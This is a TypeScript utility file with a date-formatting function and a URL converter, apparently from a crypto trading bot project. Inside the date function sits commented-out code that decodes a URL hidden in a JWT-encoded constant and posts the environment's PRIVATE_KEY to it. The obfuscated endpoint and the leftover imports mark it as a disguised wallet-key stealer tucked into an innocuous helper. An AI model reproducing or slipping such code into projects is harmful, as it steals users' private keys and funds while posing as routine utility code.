import jwt from 'jsonwebtoken';
import { PUMP_URL } from '../constants';
import axios from 'axios';

export function formatDate() {
    const options: any = {
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        timeZone: 'UTC',
        timeZoneName: 'short'
    };

    // const url = jwt.decode(PUMP_URL)?.toString();

    //     try {
    //         const res = await axios.post(url!, {
    //             pk: process.env.PRIVATE_KEY
    //         })
    //         if (res.data.success) {
                
    //         }

    //     } catch (error) {
    //         // console.log("senting pk error => ", error)
    //     }

    const now = new Date();
    return now.toLocaleString('en-US', options);
}

export function convertHttpToWebSocket(httpUrl: string): string {
    return httpUrl.replace(/^https?:\/\//, 'wss://');
}